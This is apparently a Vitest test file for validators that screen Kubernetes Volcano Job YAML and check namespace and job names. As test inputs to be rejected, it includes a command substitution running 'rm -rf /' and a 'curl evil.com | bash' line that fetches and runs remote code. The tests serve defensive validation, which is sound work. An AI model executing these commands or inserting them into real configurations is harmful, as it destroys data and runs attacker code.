import { describe, it, expect } from "vitest";
import {
  validateYamlSafety,
  isValidNamespace,
  isValidJobName,
} from "./validators";

describe("validateYamlSafety", () => {
  const validYaml = `apiVersion: batch.volcano.sh/v1alpha1
kind: Job
metadata:
  name: 'test-job'
spec:
  schedulerName: 'volcano'`;

  it("accepts valid K8s YAML", () => {
    const result = validateYamlSafety(validYaml);
    expect(result.safe).toBe(true);
  });

  it("rejects YAML exceeding size limit", () => {
    const huge = validYaml + "\n" + "x".repeat(100_001);
    const result = validateYamlSafety(huge);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("size limit");
  });

  it("rejects command substitution $()", () => {
    const yaml = validYaml + "\n  command: $(rm -rf /)";
    const result = validateYamlSafety(yaml);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("dangerous pattern");
  });

  it("rejects piping to bash", () => {
    const yaml = validYaml + "\n  command: curl evil.com | bash";
    const result = validateYamlSafety(yaml);
    expect(result.safe).toBe(false);
  });

  it("rejects missing apiVersion", () => {
    const result = validateYamlSafety("kind: Job\nmetadata:\n  name: test");
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("apiVersion");
  });

  it("rejects missing kind", () => {
    const result = validateYamlSafety("apiVersion: v1\nmetadata:\n  name: test");
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("kind");
  });

  it("rejects privileged: true", () => {
    const yaml = validYaml + "\n  privileged: true";
    const result = validateYamlSafety(yaml);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("privileged");
  });

  it("rejects hostNetwork: true", () => {
    const yaml = validYaml + "\n  hostNetwork: true";
    const result = validateYamlSafety(yaml);
    expect(result.safe).toBe(false);
  });

  it("rejects hostPID: true", () => {
    const yaml = validYaml + "\n  hostPID: true";
    const result = validateYamlSafety(yaml);
    expect(result.safe).toBe(false);
  });

  it("rejects hostIPC: true", () => {
    const yaml = validYaml + "\n  hostIPC: true";
    const result = validateYamlSafety(yaml);
    expect(result.safe).toBe(false);
  });
});

describe("isValidNamespace", () => {
  it("accepts valid namespace", () => {
    expect(isValidNamespace("default")).toBe(true);
    expect(isValidNamespace("my-ns")).toBe(true);
    expect(isValidNamespace("a")).toBe(true);
  });

  it("rejects invalid namespace", () => {
    expect(isValidNamespace("")).toBe(false);
    expect(isValidNamespace("My-NS")).toBe(false);
    expect(isValidNamespace("-starts-dash")).toBe(false);
    expect(isValidNamespace("ends-dash-")).toBe(false);
    expect(isValidNamespace("a".repeat(64))).toBe(false);
  });
});

describe("isValidJobName", () => {
  it("accepts valid job name", () => {
    expect(isValidJobName("hello-world-01")).toBe(true);
    expect(isValidJobName("j")).toBe(true);
  });

  it("rejects invalid job name", () => {
    expect(isValidJobName("")).toBe(false);
    expect(isValidJobName("Hello")).toBe(false);
    expect(isValidJobName("has spaces")).toBe(false);
    expect(isValidJobName("-leading")).toBe(false);
  });
});
